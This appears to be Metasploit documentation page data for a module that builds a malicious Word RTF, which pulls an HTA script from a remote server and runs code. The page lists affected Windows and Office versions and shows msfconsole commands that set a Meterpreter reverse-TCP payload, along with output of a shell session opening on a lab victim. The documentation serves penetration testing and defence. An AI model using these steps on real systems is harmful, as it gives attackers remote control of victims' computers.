{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/fileformat/office_word_hta","result":{"data":{"moduleMetadataJson":{"id":"6b3505ed-0310-57a1-abcd-aba9c0ef8007","name":"Microsoft Office Word Malicious Hta Execution","fullname":"exploit/windows/fileformat/office_word_hta","description":"This module creates a malicious RTF file that when opened in\n        vulnerable versions of Microsoft Word will lead to code execution.\n        The flaw exists in how a olelink object can make a http(s) request,\n        and execute hta code in response.\n\n        This bug was originally seen being exploited in the wild starting\n        in Oct 2016. This module was created by reversing a public\n        malware sample.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/fileformat/office_word_hta","documentationSlug":"/modules/documentation/exploit/windows/fileformat/office_word_hta","referencesSlug":"/modules/references/exploit/windows/fileformat/office_word_hta"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Microsoft Office is an office suite of applications, servers, and services developed by Microsoft.\nMicrosoft Office contains Microsoft Word, Microsoft Excel, Microsoft PowerPoint and so on.\nThey can support OLE data integration and Visual Basic for Application scripting language.</p>\n<p>FireEye detected malicious Microsoft Office RTF documents that leverage a previously undisclosed vulnerability.\nThis vulnerability allows a malicious actor to execute a Visual Basic script when the user opens a document containing an embedded exploit.\nFireEye has observed several Office documents exploiting the vulnerability that download and execute malware payloads from different well-known malware families.</p>\n<p>The attack involves a threat actor emailing a Microsoft Word document to a targeted user with an embedded OLE2link object.\nWhen the user opens the document, winword.exe issues a HTTP request to a remote server to retrieve a malicious .hta file, which appears as a fake RTF file.\nThe Microsoft HTA application loads and executes the malicious script. In both observed documents the malicious script terminated the winword.exe process,\ndownloaded additional payload(s), and loaded a decoy document for the user to see. The original winword.exe process is terminated in order to hide a\nuser prompt generated by the OLE2link.</p>\n<ul>\n<li>Windows Vista Service Pack 2</li>\n<li>Windows Vista x64 Edition Service Pack 2</li>\n<li>Windows 7 for 32-bit Systems Service Pack 1</li>\n<li>Windows 7 for x64-based Systems Service Pack 1</li>\n<li>Windows Server 2008 for 32-bit Systems Service Pack 2</li>\n<li>Windows Server 2008 R2 for x64-based Systems Service Pack 1</li>\n<li>Windows Server 2008 for x64-based Systems Service Pack 2</li>\n<li>Windows Server 2008 for Itanium-Based Systems Service Pack 2</li>\n<li>Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1</li>\n<li>Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)</li>\n<li>Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)</li>\n<li>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</li>\n<li>Windows Server 2012</li>\n<li>Windows Server 2012 (Server Core installation)</li>\n<li>Microsoft Office 2007 Service Pack 3</li>\n<li>Microsoft Office 2013 Service Pack 1 (32-bit editions)</li>\n<li>Microsoft Office 2013 Service Pack 1 (64-bit editions)</li>\n<li>Microsoft Office 2010 Service Pack 2 (32-bit editions)</li>\n<li>Microsoft Office 2010 Service Pack 2 (64-bit editions)</li>\n<li>Microsoft Office 2016 (32-bit edition)</li>\n<li>Microsoft Office 2016 (64-bit edition)</li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/windows/fileformat/office_word_hta</code></li>\n<li>Do: <code class=\"language-text\">set payload [PAYLOAD NAME]</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/windows/fileformat/office_word_hta\nmsf exploit(office_word_hta) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf exploit(office_word_hta) &gt; set lhost 192.168.146.1\nlhost =&gt; 192.168.146.1\nmsf exploit(office_word_hta) &gt; set srvhost 192.168.146.1\nsrvhost =&gt; 192.168.146.1\nmsf exploit(office_word_hta) &gt; run\n[*] Exploit running as background job.\n\n[*] Started reverse TCP handler on 192.168.146.1:4444\n[+] msf.doc stored at /Users/wchen/.msf4/local/msf.doc\n[*] Using URL: http://192.168.146.1:8080/default.hta\n[*] Server started.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>After you have the malicious doc file and servers ready, copy the doc file onto the victim machine,\nand open it with Microsoft Office Word. You should receive a session:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Sending stage (957487 bytes) to 192.168.146.145\n[*] Meterpreter session 1 opened (192.168.146.1:4444 -&gt; 192.168.146.145:50165) at 2017-04-24 16:00:49 -0500</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"6b3505ed-0310-57a1-abcd-aba9c0ef8007"}}}